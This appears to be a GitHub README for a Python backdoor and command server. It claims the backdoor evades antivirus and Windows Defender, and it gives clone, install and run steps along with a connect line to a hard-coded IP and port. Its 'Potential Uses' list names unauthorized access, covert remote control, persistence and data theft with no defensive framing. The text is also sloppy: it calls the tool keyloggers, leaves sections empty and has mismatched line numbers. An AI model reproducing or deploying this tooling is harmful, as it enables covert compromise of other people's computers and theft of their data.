## Backdoor-And-Server üñ•Ô∏èüîç

This is a simple server-client Python application that allows you to remotely execute basic commands on the server from the backdoor. 

We can use this project to establish a connection between a server and backdoor , this code is personally crafted and succesful in bypassing the antivirus and windows defender üç¥‚ú®



## Warning ‚ö†Ô∏è‚ò†Ô∏è

## Installation Process üì•

First, clone the repository and navigate to the Backdoor-And-Server directory:

```
$ git clone https://github.com/Advaidv121/Backdoor-And-Server && cd Backdoor-And-Server
```

Next, install the requrements using pip3 with the following instructions:

For **Server.py**
```
$ pip3 install -r srequirements.txt
```
For **Backdoor.py**
```
$ pip3 install -r brequirements.txt
```

## Pre Execution ‚èÆÔ∏è

On line number **120** of **server.py** file
```
36. sock.bind(('xx.xxx.xx.xx',xxxx)) #replace 'xx.xxx.xx.xx'
```
On line number **160** of **backdoor.py** file
```
160. s.connect(('68.183.89.11',5555))  #replace 'username' 'password'
```

## Execution üèÉ‚Äç‚ôÇÔ∏è

Run the backdoor.py script on the machine you want to control:
```
python backdoor.py
```
Run the server.py script on the machine from which you want to control the server:
```
python server.py
```
This will establish a connection with the server, and you can start sending commands to be executed on the server.üõú

## Available Commands

Here's a table of the commands you can run on the server from the client:

## Potential Uses üí°

Keyloggers can be used for:

-Unauthorized Access: Malicious actors use backdoors to gain unauthorized access to a computer system, network, or device. This unauthorized access can lead to data theft, surveillance, or further exploitation.

-Remote Control: Backdoors provide remote control over a compromised system. Attackers can manipulate the victim's computer, executing commands and actions without the user's knowledge or consent.

-Persistence: Backdoors are often used to maintain a persistent presence within a compromised network or system. This allows attackers to maintain access even if initial security flaws are patched.

-Data Theft: Backdoors enable the exfiltration of sensitive data, such as personal information, financial records, or intellectual property, which can then be misused or sold.
